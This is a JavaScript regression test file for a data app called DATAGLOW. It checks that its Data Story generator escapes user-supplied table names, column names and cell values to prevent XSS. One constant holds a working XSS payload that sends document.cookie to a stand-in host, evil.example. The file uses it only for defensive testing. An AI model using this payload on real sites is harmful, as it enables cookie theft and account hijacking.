// ============================================================
// DATAGLOW — Story Engine XSS regression tests
// ============================================================
// Guards the stored/DOM-XSS fix: uploaded table names, column names, and cell
// values are user-controlled (DATAGLOW loads arbitrary CSV/JSON/Parquet) and
// flow into the "Data Story" narrative that main.js writes via innerHTML. This
// asserts generateLocalStory() escapes every one of those interpolations so a
// malicious identifier like `<img src=x onerror=alert(1)>` can never render as
// an executable tag.
//
// RUN WITH:  node test/story-xss.test.mjs

import { generateLocalStory } from '../js/story.js';
import { escapeHtml } from '../js/utils.js';

let passed = 0;
let failed = 0;
function ok(cond, msg) {
  if (cond) { passed++; console.log(`✓ ${msg}`); }
  else { failed++; console.log(`✗ FAILED: ${msg}`); }
}

// The classic exploit payload plus every individually-dangerous character.
const PAYLOAD = `<img src=x onerror=fetch('https://evil.example/?c='+document.cookie)>`;
const ALL_SPECIALS = `<>"'&`;

// Assert a rendered story string is safe: it must not contain any raw executable
// tag, and every dangerous char that came from user data must be entity-encoded.
function assertNoRawInjection(html, label) {
  ok(!/<img/i.test(html), `${label}: no unescaped <img tag`);
  ok(!/<script/i.test(html), `${label}: no unescaped <script tag`);
  // The raw payload (with live angle brackets) must never survive verbatim; an
  // "onerror=" substring is only dangerous inside a real tag, and every "<" it
  // could sit in has been neutralized to "&lt;".
  ok(!html.includes(PAYLOAD), `${label}: raw payload string does not appear verbatim`);
  // The escaped form MUST be present — proves the payload survived only as inert text.
  ok(html.includes('&lt;img'), `${label}: payload appears in escaped form (&lt;img)`);
}

// ---------- Malicious column name (numeric col path) ----------
{
  const result = {
    columns: [PAYLOAD, 'category'],
    rows: [
      { [PAYLOAD]: 10, category: 'a' },
      { [PAYLOAD]: 20, category: 'b' },
      { [PAYLOAD]: 30, category: 'a' },
    ],
    rowCount: 3,
  };
  const html = generateLocalStory(result, 'patients');
  assertNoRawInjection(html, 'malicious numeric column name');
}

// ---------- Malicious column name (categorical col path) ----------
{
  const result = {
    columns: ['amount', PAYLOAD],
    rows: [
      { amount: 1, [PAYLOAD]: 'x' },
      { amount: 2, [PAYLOAD]: 'y' },
    ],
    rowCount: 2,
  };
  const html = generateLocalStory(result, 'patients');
  assertNoRawInjection(html, 'malicious categorical column name');
}

// ---------- Malicious most-common cell VALUE ----------
{
  const result = {
    columns: ['dept'],
    rows: [
      { dept: PAYLOAD },
      { dept: PAYLOAD },
      { dept: 'cardiology' },
    ],
    rowCount: 3,
  };
  const html = generateLocalStory(result, 'patients');
  assertNoRawInjection(html, 'malicious cell value');
  ok(!/is "<img/i.test(html), 'malicious cell value: not injected raw into the quoted value slot');
}

// ---------- Malicious TABLE name (non-empty result) ----------
{
  const result = {
    columns: ['amount'],
    rows: [{ amount: 5 }, { amount: 7 }],
    rowCount: 2,
  };
  const html = generateLocalStory(result, PAYLOAD);
  assertNoRawInjection(html, 'malicious table name');
}

// ---------- Malicious TABLE name (empty result path) ----------
{
  const html = generateLocalStory({ columns: ['a'], rows: [], rowCount: 0 }, PAYLOAD);
  assertNoRawInjection(html, 'malicious table name (empty-rows branch)');
}

// ---------- Every dangerous character is individually encoded ----------
{
  const colName = `col ${ALL_SPECIALS}`;
  const result = {
    columns: [colName],
    rows: [{ [colName]: 'v1' }, { [colName]: 'v1' }, { [colName]: 'v2' }],
    rowCount: 3,
  };
  const html = generateLocalStory(result, 'tbl');
  // The literal special-char run must not appear verbatim; its escaped form must.
  ok(!html.includes(ALL_SPECIALS), 'all-specials: raw < > " \' & run is not present verbatim');
  ok(html.includes('&lt;&gt;&quot;&#39;&amp;'), 'all-specials: run appears fully entity-encoded');
}

// ---------- escapeHtml itself covers all five dangerous characters ----------
{
  ok(escapeHtml('<') === '&lt;', 'escapeHtml encodes <');
  ok(escapeHtml('>') === '&gt;', 'escapeHtml encodes >');
  ok(escapeHtml('"') === '&quot;', 'escapeHtml encodes "');
  ok(escapeHtml("'") === '&#39;', "escapeHtml encodes '");
  ok(escapeHtml('&') === '&amp;', 'escapeHtml encodes &');
}

// ---------- Sanity: a benign story still renders its intended safe markup ----------
{
  const html = generateLocalStory({
    columns: ['amount', 'dept'],
    rows: [{ amount: 10, dept: 'cardiology' }, { amount: 20, dept: 'cardiology' }],
    rowCount: 2,
  }, 'patients');
  ok(/<span class="story-highlight">amount<\/span>/.test(html), 'benign: keeps intended safe <span> markup');
  ok(/cardiology/.test(html), 'benign: renders the real cell value');
}

console.log(`\n${passed} passed, ${failed} failed`);
process.exit(failed > 0 ? 1 : 0);
